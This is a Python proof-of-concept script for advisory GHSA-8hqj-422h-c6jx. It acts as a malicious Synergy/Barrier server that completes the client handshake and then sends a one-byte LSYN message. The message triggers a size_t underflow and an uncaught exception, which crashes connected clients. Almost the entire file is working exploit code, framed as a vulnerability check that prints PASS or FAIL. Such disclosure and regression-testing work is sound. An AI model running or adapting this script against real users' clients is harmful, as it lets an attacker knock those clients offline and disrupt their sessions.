#!/usr/bin/env python3
"""
GHSA-8hqj-422h-c6jx - Synergy client LSYN single-byte payload uncaught exception.

A malicious or compromised server can terminate a connected client by sending an
LSYN (language synchronisation) message whose payload is exactly ONE byte.
src/lib/deskflow/KeyboardLayoutManager.cpp::setRemoteLayouts splits the payload
into two-character ISO 639-1 layout codes and bounds the loop with
"i <= remoteLayouts.size() - 2". With a one-byte payload that expression
underflows size_t to SIZE_MAX, so the loop runs a second time and calls
substr(2, 2) with pos past the end of the view. std::string_view::substr throws
std::out_of_range, ServerProxy::handleData catches only BadClientException, and
the exception is fatal in App::run.

This PoC is the malicious server: it listens, speaks the plaintext v1.8
handshake ("Barrier" hello, then reads the client's helloback), completes a
realistic QINF/DINF exchange, then pushes the malformed LSYN:

    4c 53 59 4e 00 00 00 01 61              LSYN | len=1 | "a"

Only length 1 reaches the throw. Longer odd lengths (3, 5, 7) stop the loop
early and silently truncate the trailing byte, and an empty payload is a valid
"clear the layout list" message, so --length is provided to check those too.

Detection: unlike the DSOP sibling this is not a memory-safety bug - substr
bounds-checks and throws, so no ASan build is needed. A vulnerable client exits
with code 1 and drops the connection (VULNERABLE). A fixed client logs
"remote layouts are the incorrect size, can not process them" and stays
connected (PASS). Prereq: point a client at this host with tls disabled, since
the handshake here is plaintext.
"""

import argparse
import socket
import struct
import sys
import time

PROTO_MAJOR, PROTO_MINOR = 1, 8
HELLO = b"Barrier"


def frame(payload):
    return struct.pack(">I", len(payload)) + payload


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed during read")
        buf.extend(chunk)
    return bytes(buf)


def recv_packet(sock):
    size = struct.unpack(">I", recv_exact(sock, 4))[0]
    return recv_exact(sock, size) if size else b""


def handshake(conn):
    conn.sendall(frame(HELLO + struct.pack(">HH", PROTO_MAJOR, PROTO_MINOR)))
    helloback = recv_packet(conn)
    if len(helloback) < 7 or helloback[:7] not in (b"Barrier", b"Synergy"):
        raise RuntimeError(f"unexpected helloback: {helloback!r}")

    # The crash does not depend on screen info, but a real server queries it
    # before pushing options, so keep the session shaped like the genuine one.
    conn.sendall(frame(b"QINF"))
    recv_packet(conn)
    return helloback


def malformed_lsyn(length):
    # LSYN is "LSYN%s", a length-prefixed run of concatenated two-character
    # layout codes. A one-byte payload is the only length that drives
    # setRemoteLayouts past the end of the view.
    return b"LSYN" + struct.pack(">I", length) + b"a" * length


def client_survived(conn, window=3.0):
    conn.settimeout(0.5)
    deadline = time.monotonic() + window
    while time.monotonic() < deadline:
        try:
            data = conn.recv(4096)
        except socket.timeout:
            continue
        except OSError:
            return False
        if not data:
            return False
    return True


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1", help="address to bind the malicious server on")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--length", type=int, default=1,
                    help="lsyn payload length; only 1 triggers the crash")
    ap.add_argument("--timeout", type=float, default=60.0,
                    help="seconds to wait for a client to connect")
    args = ap.parse_args()

    print("GHSA-8hqj-422h-c6jx - lsyn single-byte payload uncaught exception")
    print(f"malicious server on {args.host}:{args.port}")
    print("start a synergy client (tls disabled) pointed at this address\n")

    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.host, args.port))
    listener.listen(1)
    listener.settimeout(args.timeout)

    print("[*] waiting for client")
    try:
        conn, peer = listener.accept()
    except socket.timeout:
        print("[ERROR] no client connected within the timeout")
        return 2
    finally:
        listener.close()

    with conn:
        conn.settimeout(10.0)
        try:
            helloback = handshake(conn)
        except (OSError, RuntimeError, ConnectionError) as e:
            print(f"[ERROR] handshake failed: {e}")
            return 2
        print(f"client connected from {peer[0]}:{peer[1]}, helloback: {len(helloback)} bytes")

        conn.sendall(frame(malformed_lsyn(args.length)))
        print(f"sent malformed lsyn, payload length {args.length}")

        alive = client_survived(conn)

    if alive:
        print("[PASS] client survived - odd-length layouts rejected, fix in place")
        return 0
    print("[FAIL] client dropped connection - VULNERABLE (GHSA-8hqj-422h-c6jx)")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
